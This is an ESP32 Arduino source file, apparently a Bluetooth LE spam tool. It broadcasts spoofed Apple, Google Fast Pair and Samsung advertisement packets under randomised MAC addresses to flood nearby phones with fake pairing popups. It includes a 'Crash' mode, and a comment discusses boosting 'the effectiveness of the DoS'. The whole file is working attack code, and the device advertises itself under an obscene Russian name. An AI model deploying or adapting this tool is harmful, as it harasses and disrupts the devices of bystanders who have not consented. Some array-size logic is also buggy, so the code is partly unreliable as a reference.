// This example takes heavy inpsiration from the ESP32 example by ronaldstoner
// Based on the previous work of chipik / _hexway / ECTO-1A & SAY-10
// See the README for more info
#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>

bool isBezobid = true;
bool isActive;
bool ios = false;
int typeAndroid;

int typeAttach = 0;

#define LED 2

BLEAdvertising *pAdvertising; 


uint32_t delaySeconds = 1;
                                                  // ios devices
const uint8_t DEVICES[][31] = {
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
};

const uint8_t SHORT_DEVICES[][23] = {
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
};
                                            //Android Devices
uint32_t buds_models[] = {0xEE7A0C,0x9D1700, 0x39EA48, 0xA7C62C, 0x850116, 0x3D8F41, 0x3B6D02, 0xAE063C, 0xB8B905, 0xEAAA17, 0xD30704, 0x9DB006,0x101F1A, 0x859608, 0x8E4503, 0x2C6740, 0x3F6718, 0x42C519, 0xAE073A, 0x011716};
const uint8_t buds_models_count = 18;

uint32_t models[] = 
    {0x00000C, 0x0001F0, 0x000047, 0x00000A, 0x0A0000, 0x00000B,
     0x0B0000, 0x0C0000, 0x00000D, 0x000007, 0x070000, 0x000008,
     0x080000, 0x000009, 0x090000, 0x000048, 0x000049, 0xCD8256,
     0x0000F0, 0x821F66, 0xF52494, 0x718FA4, 0x0002F0, 0x92BBBD,
     0x000006, 0x060000, 0xD446A7, 0x2D7A23, 0x0E30C3, 0x72EF8D,
     0x72FB00, 0x0003F0, 0xD99CA1, 0x77FF67, 0xAA187F, 0xDCE9EA,
     0x87B25F, 0xF38C02, 0x1448C9, 0xD5AB33, 0x0C0B67, 0x13B39D,
     0xAA1FE1, 0x7C6CDB, 0x005EF9, 0xE2106F, 0xB37A62
     };

uint8_t watch_models[] = { 0x1A, 0x01,0x02, 0x03, 0x04, 0x05,0x06,0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x1B, 0x1C, 0x1D, 0x1E, 0x20};
const uint8_t watch_models_count = 24 ;


void changeAdress(){
       esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
        for (int i = 0; i < 6; i++){
          dummy_addr[i] = random(256);
              }
        int adv_type_choice = random(3);
        if (adv_type_choice == 0){
          pAdvertising->setAdvertisementType(ADV_TYPE_IND);
        } else if (adv_type_choice == 1){
          pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
        } else {
          pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
        }
         pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
      }


void setup() {
  Serial.begin(115200);
  Serial.println("Starting ESP32 BLE");
  pinMode(LED,OUTPUT);
  BLEDevice::init("Иди Нахуй");
  pinMode(LED,OUTPUT);
  // Create the BLE Server
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9); 
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN ,ESP_PWR_LVL_P9);
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  // seems we need to init it with an address in setup() step.
  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}

BLEAdvertisementData getOAdvertisementData() {
  
  if(ios){
  BLEAdvertisementData randomAdvertisementData = BLEAdvertisementData();
  uint8_t packet[17];
  uint8_t i = 0;
    packet[i++] = 16;    // Packet Length
    packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
    packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
    packet[i++] = 0x00;        // ...
    packet[i++] = 0x0F;  // Type
    packet[i++] = 0x05;                        // Length
    packet[i++] = 0xC1;                        // Action Flags
    const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
    packet[i++] = types[rand() % sizeof(types)];  // Action Type
    esp_fill_random(&packet[i], 3); // Authentication Tag
    i += 3;
    packet[i++] = 0x00;  // ???
    packet[i++] = 0x00;  // ???
    packet[i++] =  0x10;  // Type ???
    esp_fill_random(&packet[i], 3);
    randomAdvertisementData.addData(std::string((char *)packet, 17));
    return randomAdvertisementData;
  }
    
 else{
     BLEAdvertisementData randomAdvertisementData = BLEAdvertisementData();

     typeAndroid = random(0,2);
     if(typeAndroid == 0){
     uint8_t packeAndroidWatch[14];
     uint8_t model = watch_models[rand() % sizeof(watch_models)];
     uint8_t i = 0;
        packeAndroidWatch[i++] = 14; // Size
        packeAndroidWatch[i++] = 0xFF; // AD Type (Manufacturer Specific)
        packeAndroidWatch[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
        packeAndroidWatch[i++] = 0x00; // ...
        packeAndroidWatch[i++] = 0x01;
        packeAndroidWatch[i++] = 0x00;
        packeAndroidWatch[i++] = 0x02;
        packeAndroidWatch[i++] = 0x00;
        packeAndroidWatch[i++] = 0x01;
        packeAndroidWatch[i++] = 0x01;
        packeAndroidWatch[i++] = 0xFF;
        packeAndroidWatch[i++] = 0x00;
        packeAndroidWatch[i++] = 0x00;
        packeAndroidWatch[i++] = 0x43;
        packeAndroidWatch[i++] = (model >> 0x00) & 0xFF; //watch_models[rand() % sizeof(watch_models)];
        randomAdvertisementData.addData(std::string((char*)packeAndroidWatch, i));
  } else{
    uint8_t packet[14];
    uint8_t i = 0;
    uint32_t model = models[rand() % sizeof(models)];
    packet[i++] = 3; // Size
    packet[i++] = 0x03; // AD Type (Service UUID List)
    packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
    packet[i++] = 0xFE; // ...

    packet[i++] = 6; // Size
    packet[i++] = 0x16; // AD Type (Service Data)
    packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
    packet[i++] = 0xFE; // ...
    packet[i++] = (model >> 0x10) & 0xFF;
    packet[i++] = (model >> 0x08) & 0xFF;
    packet[i++] = (model >> 0x00) & 0xFF;

    packet[i++] = 2; // Size
    packet[i++] = 0x0A; // AD Type (Tx Power Level)
    packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm
    randomAdvertisementData.addData(std::string((char*)packet, i));
      }
    return randomAdvertisementData;
     }
 }

 void iosAttach(bool Crash){
   if(!Crash){
        // First generate fake random MAC
        esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
        for (int i = 0; i < 6; i++){
          dummy_addr[i] = random(256);
          // It seems for some reason first 4 bits
          // Need to be high (aka 0b1111), so we 
          // OR with 0xF0
          //if (i == 0){
            //dummy_addr[i] |= 0xF0;
          //}
        }
      
        BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
      
        // Randomly pick data from one of the devices
        // First decide short or long
        // 0 = long (headphones), 1 = short (misc stuff like Apple TV)
        int device_choice = random(2);
        //int device_choice = 1;
        if (device_choice == 0){
          int index = random(17);
          oAdvertisementData.addData(std::string((char*)DEVICES[index], 31));
        } else {
          int index = random(12);
          oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[index], 23));
        }
      
        /*  Page 191 of Apple's "Accessory Design Guidelines for Apple Devices (Release R20)" recommends to use only one of
            the three advertising PDU types when you want to connect to Apple devices.
                // 0 = ADV_TYPE_IND, 
                // 1 = ADV_TYPE_SCAN_IND
                // 2 = ADV_TYPE_NONCONN_IND
            
            Randomly using any of these PDU types may increase detectability of spoofed packets. 
      
            What we know for sure:
            - AirPods Gen 2: this advertises ADV_TYPE_SCAN_IND packets when the lid is opened and ADV_TYPE_NONCONN_IND when in pairing mode (when the rear case btton is held).
                              Consider using only these PDU types if you want to target Airpods Gen 2 specifically.
        */
      
        int adv_type_choice = random(3);
        if (adv_type_choice == 0){
          pAdvertising->setAdvertisementType(ADV_TYPE_IND);
        } else if (adv_type_choice == 1){
          pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
        } else {
          pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
        }
      
        // Set the device address, advertisement data
        pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
        pAdvertising->setAdvertisementData(oAdvertisementData);
      
        // Set advertising interval
        /*  According to Apple' Technical Q&A QA1931 (https://developer.apple.com/library/archive/qa/qa1931/_index.html), Apple recommends
            an advertising interval of 20ms to developers who want to maximize the probability of their BLE accessories to be discovered by iOS.
            
            These lines of code fixes the interval to 20ms. Enabling these MIGHT increase the effectiveness of the DoS. Note this has not undergone thorough testing.
        */
      
        //pAdvertising->setMinInterval(0x20);
        //pAdvertising->setMaxInterval(0x20);
        //pAdvertising->setMinPreferred(0x20);
        //pAdvertising->setMaxPreferred(0x20);
      
        // Start advertising
         Serial.println("Sending Advertisement...");
         digitalWrite(LED,HIGH);
         pAdvertising->start();
         delay(50); // delay for delaySeconds seconds
         digitalWrite(LED,LOW);
         pAdvertising->stop();
      } else{
       changeAdress();
        delay(40);
        BLEAdvertisementData advertisementData = getOAdvertisementData();
        pAdvertising->setAdvertisementData(advertisementData);
        pAdvertising->start();
        delay(50);
        pAdvertising->stop();
        }
     }

   void androidAttach(){
    int adv_type_choice = random(3);
        if (adv_type_choice == 0){
          pAdvertising->setAdvertisementType(ADV_TYPE_IND);
        } else if (adv_type_choice == 1){
          pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
        } else {
          pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
        }
    delay(40);
    changeAdress();
    BLEAdvertisementData advertisementData = getOAdvertisementData();
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->start();
    delay(50);
    pAdvertising->stop();
    }



void loop() {
  
switch(typeAttach)
{
 case 0:
      androidAttach();
      break;
 
 case 1:
      iosAttach(false);
      break;
 
 case 2:
      iosAttach(false);
      androidAttach();
      break;

 case 3:
      iosAttach(true);
      break;
 
 case 4:
      iosAttach(true);
      androidAttach();
      break;
 default:
    // statements
    break;
     }
   }
